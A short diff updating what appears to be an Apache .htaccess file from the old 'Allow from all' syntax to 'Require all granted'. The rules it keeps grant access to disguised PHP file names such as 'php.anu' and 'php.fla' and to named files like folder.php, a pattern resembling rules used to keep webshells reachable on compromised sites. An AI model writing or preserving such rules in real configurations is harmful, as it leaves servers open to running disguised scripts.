@@ -1,9 +1,8 @@
-<FilesMatch ".(php|Php|pHp|pHP|Php.asp|php.anu|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7)">
-Order allow,allow
-Allow from all
+<FilesMatch "\.(php|Php|pHp|pHP|php3|php2|Php1|pht|php\.anu|php\.fla)$">
+    Require all granted
 </FilesMatch>
 
-<FilesMatch "^(index.html|index.php|sitemap.xml|robots.txt|folder.php|template.php|sitemap.php|list.txt)$">
-Order allow,allow
-Allow from all
+<FilesMatch "^(index\.html|index\.php|sitemap\.xml|robots\.txt|folder\.php|template\..*)$">
+    Require all granted
 </FilesMatch>
+
